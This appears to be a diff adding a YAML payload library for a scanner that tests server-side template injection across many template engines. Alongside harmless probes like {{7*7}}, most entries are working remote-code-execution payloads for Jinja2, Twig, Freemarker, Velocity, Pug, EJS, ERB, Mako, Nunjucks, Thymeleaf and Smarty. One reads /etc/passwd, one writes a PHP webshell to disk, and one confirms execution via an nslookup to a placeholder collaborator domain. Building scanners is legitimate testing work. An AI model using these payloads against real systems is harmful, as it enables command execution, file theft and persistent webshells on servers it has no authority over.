@@ -1,0 +1,468 @@
+defaults:
+  vuln_type: ssti
+  encoding: raw
+  source: ensphere
+
+payloads:
+  # Detection probes (engine-agnostic)
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "{{7*7}}"
+    notes: "Universal SSTI probe. If response contains 49, template engine evaluates expressions."
+    tags: [probe, detection, universal]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "${7*7}"
+    notes: "Alternative expression syntax. Works in some engines (Freemarker, Mako)."
+    tags: [probe, detection, dollar]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "{{7*'7'}}"
+    notes: "String multiplication probe. Jinja2 returns 7777777. Twig returns 49."
+    tags: [probe, detection, fingerprint]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<%= 7*7 %>"
+    notes: "ERB/EJS expression syntax. Returns 49 if ERB-style engine."
+    tags: [probe, detection, erb]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "#{7*7}"
+    notes: "Ruby/Pug expression syntax."
+    tags: [probe, detection, ruby, pug]
+
+  # Jinja2 (Python/Flask)
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    runtime: python
+    payload: "{{config}}"
+    notes: "Jinja2 — dump Flask config object. Leaks SECRET_KEY and other settings."
+    tags: [jinja2, python, config, extraction]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    runtime: python
+    payload: "{{config.items()}}"
+    notes: "Jinja2 — dump all Flask config key-value pairs."
+    tags: [jinja2, python, config]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 4
+    runtime: python
+    payload: "{{''.__class__.__mro__[1].__subclasses__()}}"
+    notes: "Jinja2 — enumerate available Python subclasses for RCE."
+    tags: [jinja2, python, subclasses, rce_prep]
+
+  - technique: sandbox_escape
+    injection_surface: query
+    evidence_type: content_match
+    risk: 4
+    runtime: python
+    payload: "{{''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate()}}"
+    placeholders: [INDEX]
+    notes: "Jinja2 — RCE via subprocess.Popen subclass. INDEX is the position of Popen in subclasses list."
+    tags: [jinja2, python, rce, sandbox_escape]
+
+  - technique: sandbox_escape
+    injection_surface: query
+    evidence_type: content_match
+    risk: 4
+    runtime: python
+    payload: "{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}"
+    notes: "Jinja2 — RCE via warnings.catch_warnings to access builtins."
+    tags: [jinja2, python, rce, sandbox_escape, warnings]
+
+  - technique: sandbox_escape
+    injection_surface: query
+    evidence_type: content_match
+    risk: 4
+    runtime: python
+    payload: "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
+    notes: "Jinja2 — RCE via request object globals. Flask-specific."
+    tags: [jinja2, python, rce, flask, request]
+
+  # Twig (PHP)
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    runtime: php
+    payload: "{{_self.env.display('id')}}"
+    notes: "Twig — attempt to access internal environment."
+    tags: [twig, php, internal]
+
+  - technique: sandbox_escape
+    injection_surface: query
+    evidence_type: content_match
+    risk: 4
+    runtime: php
+    payload: "{{['id']|filter('system')}}"
+    notes: "Twig 3.x — RCE via filter function. Passes 'id' through system()."
+    tags: [twig, php, rce, filter]
+
+  - technique: sandbox_escape
+    injection_surface: query
+    evidence_type: content_match
+    risk: 4
+    runtime: php
+    payload: "{{['id']|map('system')}}"
+    notes: "Twig — RCE via map filter with system function."
+    tags: [twig, php, rce, map]
+
+  - technique: sandbox_escape
+    injection_surface: query
+    evidence_type: content_match
+    risk: 4
+    runtime: php
+    payload: "{{'/etc/passwd'|file_excerpt(0,100)}}"
+    notes: "Twig — file read via file_excerpt filter."
+    tags: [twig, php, file_read]
+
+  # Freemarker (Java)
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    runtime: jvm
+    payload: "${7*7?c}"
+    notes: "Freemarker expression evaluation with ?c number format built-in."
+    tags: [freemarker, java, probe]
+
+  - technique: sandbox_escape
+    injection_surface: query
+    evidence_type: content_match
+    risk: 4
+    runtime: jvm
+    payload: "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"
+    notes: "Freemarker — RCE via Execute utility class."
+    tags: [freemarker, java, rce]
+
+  - technique: sandbox_escape
+    injection_surface: query
+    evidence_type: content_match
+    risk: 4
+    runtime: jvm
+    payload: "${\"freemarker.template.utility.Execute\"?new()(\"id\")}"
+    notes: "Freemarker — shorter RCE syntax."
+    tags: [freemarker, java, rce, short]
+
+  # Velocity (Java)
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    runtime: jvm
+    payload: "#set($x=7*7)${x}"
+    notes: "Velocity expression evaluation."
+    tags: [velocity, java, probe]
+
+  - technique: sandbox_escape
+    injection_surface: query
+    evidence_type: content_match
+    risk: 4
+    runtime: jvm
+    payload: "#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$rt.getRuntime().exec('id'))$chr"
+    notes: "Velocity — RCE via Runtime.exec."
+    tags: [velocity, java, rce]
+
+  # Pug/Jade (Node.js)
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    runtime: node
+    payload: "#{7*7+0}"
+    notes: "Pug/Jade expression evaluation."
+    tags: [pug, node, probe]
+
+  - technique: sandbox_escape
+    injection_surface: query
+    evidence_type: content_match
+    risk: 4
+    runtime: node
+    payload: "#{global.process.mainModule.require('child_process').execSync('id')}"
+    notes: "Pug — RCE via Node.js process module."
+    tags: [pug, node, rce, child_process]
+
+  # ERB (Ruby)
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    runtime: ruby
+    payload: "<%= 7*7+0 %>"
+    notes: "ERB expression evaluation."
+    tags: [erb, ruby, probe]
+
+  - technique: sandbox_escape
+    injection_surface: query
+    evidence_type: content_match
+    risk: 4
+    runtime: ruby
+    payload: "<%= system('id') %>"
+    notes: "ERB — direct RCE via system()."
+    tags: [erb, ruby, rce]
+
+  - technique: sandbox_escape
+    injection_surface: query
+    evidence_type: content_match
+    risk: 4
+    runtime: ruby
+    payload: "<%= `id` %>"
+    notes: "ERB — RCE via backtick command execution."
+    tags: [erb, ruby, rce, backtick]
+
+  # EJS (Node.js)
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    runtime: node
+    payload: "<%= 7*7; %>"
+    notes: "EJS expression evaluation with semicolon."
+    tags: [ejs, node, probe]
+
+  - technique: sandbox_escape
+    injection_surface: query
+    evidence_type: content_match
+    risk: 4
+    runtime: node
+    payload: "<%= global.process.mainModule.require('child_process').execSync('id').toString() %>"
+    notes: "EJS — RCE via child_process."
+    tags: [ejs, node, rce]
+
+  # Mako (Python)
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    runtime: python
+    payload: "${7*7+0}"
+    notes: "Mako expression evaluation. Same ${} syntax as Freemarker but in Python context. Uses +0 to differentiate from generic probe."
+    tags: [mako, python, probe]
+
+  - technique: sandbox_escape
+    injection_surface: query
+    evidence_type: content_match
+    risk: 4
+    runtime: python
+    payload: "<%import os;x=os.popen('id').read()%>${x}"
+    notes: "Mako — RCE via Python import inside <% %> block. Mako allows arbitrary Python in code blocks."
+    tags: [mako, python, rce, import]
+
+  - technique: sandbox_escape
+    injection_surface: query
+    evidence_type: content_match
+    risk: 4
+    runtime: python
+    payload: "${__import__('os').popen('id').read()}"
+    notes: "Mako — RCE via __import__ in expression context. Mako does not sandbox expressions."
+    tags: [mako, python, rce, expression]
+
+  # Handlebars/Mustache (Node.js)
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    runtime: node
+    payload: "{{this}}"
+    notes: "Handlebars — dump current context object. Reveals template variables and data model."
+    tags: [handlebars, node, probe, context]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    runtime: node
+    payload: "{{#each this}}{{@key}}={{this}} {{/each}}"
+    notes: "Handlebars — iterate and dump all key-value pairs in context. Useful for data exfil."
+    tags: [handlebars, node, extraction, context]
+
+  # Nunjucks (Node.js)
+  - technique: sandbox_escape
+    injection_surface: query
+    evidence_type: content_match
+    risk: 4
+    runtime: node
+    payload: "{{range.constructor('return global.process.mainModule.require(\\'child_process\\').execSync(\\'id\\')')()}}"
+    notes: "Nunjucks — RCE via constructor prototype. Nunjucks allows calling constructors on built-in objects."
+    tags: [nunjucks, node, rce, constructor]
+
+  # Thymeleaf (Java Spring)
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    runtime: jvm
+    payload: "__${7*7}__::x"
+    notes: "Thymeleaf — expression evaluation via pre-processing syntax. Spring MVC resolves __${}__ before template."
+    tags: [thymeleaf, java, spring, probe]
+
+  - technique: sandbox_escape
+    injection_surface: query
+    evidence_type: content_match
+    risk: 4
+    runtime: jvm
+    payload: "__${T(java.lang.Runtime).getRuntime().exec('id')}__::x"
+    notes: "Thymeleaf — RCE via SpEL T() operator in pre-processing expression. Accesses Java Runtime."
+    tags: [thymeleaf, java, spring, rce, spel]
+
+  - technique: sandbox_escape
+    injection_surface: query
+    evidence_type: content_match
+    risk: 4
+    runtime: jvm
+    payload: "__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\\\A').next()}__::x"
+    notes: "Thymeleaf — RCE with command output capture via Scanner. Returns actual command output."
+    tags: [thymeleaf, java, spring, rce, output]
+
+  # Go html/template detection probes
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    runtime: go
+    payload: "{{.}}"
+    notes: "Go template — dump current data context. If response shows struct or map contents, Go template engine confirmed."
+    tags: [go, template, probe, context]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    runtime: go
+    payload: "{{printf \"%v\" .}}"
+    notes: "Go template — verbose format of context via printf. Helps fingerprint Go's text/template or html/template."
+    tags: [go, template, probe, printf]
+
+  # Smarty (PHP)
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    runtime: php
+    payload: "{math equation=\"7*7\"}"
+    notes: "Smarty — math function evaluation. Returns 49 if Smarty is processing templates."
+    tags: [smarty, php, probe, math]
+
+  - technique: sandbox_escape
+    injection_surface: query
+    evidence_type: content_match
+    risk: 4
+    runtime: php
+    payload: "{system('id')}"
+    notes: "Smarty (older/insecure config) — direct PHP function call. Works when security_policy is not enabled."
+    tags: [smarty, php, rce, legacy]
+
+  - technique: sandbox_escape
+    injection_surface: query
+    evidence_type: content_match
+    risk: 4
+    runtime: php
+    payload: "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['c']); ?>\",self::clearConfig())}"
+    notes: "Smarty — file write via internal class. Writes a webshell to disk. Requires accessible Smarty internals."
+    tags: [smarty, php, rce, file_write]
+
+  # Razor (.NET)
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    runtime: dotnet
+    payload: "@(7*7)"
+    notes: "Razor — expression evaluation probe. Returns 49 if Razor engine processes input."
+    tags: [razor, dotnet, probe]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    runtime: dotnet
+    payload: "@System.Environment.OSVersion"
+    notes: "Razor — read OS version via System.Environment. Confirms code execution in .NET context."
+    tags: [razor, dotnet, probe, environment]
+
+  # JSON body variants
+  - technique: reflected
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 2
+    payload: "{{7*7}}"
+    notes: "SSTI probe via JSON body field."
+    tags: [probe, detection, json]
+
+  - technique: reflected
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 2
+    payload: "${7*7+0}"
+    notes: "Dollar syntax SSTI probe via JSON body."
+    tags: [probe, detection, json, dollar]
+
+  # URL-encoded
+  - technique: reflected
+    injection_surface: query
+    encoding: url
+    evidence_type: content_match
+    risk: 2
+    payload: "%7B%7B7*7%7D%7D"
+    notes: "URL-encoded {{7*7}}."
+    tags: [probe, detection, url_encoded]
+
+  - technique: reflected
+    injection_surface: query
+    encoding: url
+    evidence_type: content_match
+    risk: 2
+    payload: "%24%7B7*7%7D"
+    notes: "URL-encoded ${7*7}."
+    tags: [probe, detection, url_encoded, dollar]
+
+  # Header injection
+  - technique: reflected
+    injection_surface: header
+    evidence_type: content_match
+    risk: 2
+    payload: "{{7*7}}"
+    notes: "SSTI probe via HTTP header."
+    tags: [probe, detection, header]
+
+  # Form body injection
+  - technique: reflected
+    injection_surface: form_body
+    evidence_type: content_match
+    risk: 2
+    payload: "{{7*7}}"
+    notes: "SSTI probe via form-encoded body field (e.g., name, comment, message)."
+    tags: [probe, detection, form]
+
+  # OOB confirmation
+  - technique: reflected
+    injection_surface: query
+    evidence_type: dns_hit
+    risk: 3
+    runtime: python
+    payload: "{{request.application.__globals__.__builtins__.__import__('os').popen('nslookup COLLAB_DOMAIN').read()}}"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "Jinja2 — OOB DNS confirmation of RCE."
+    tags: [jinja2, python, oob, dns]
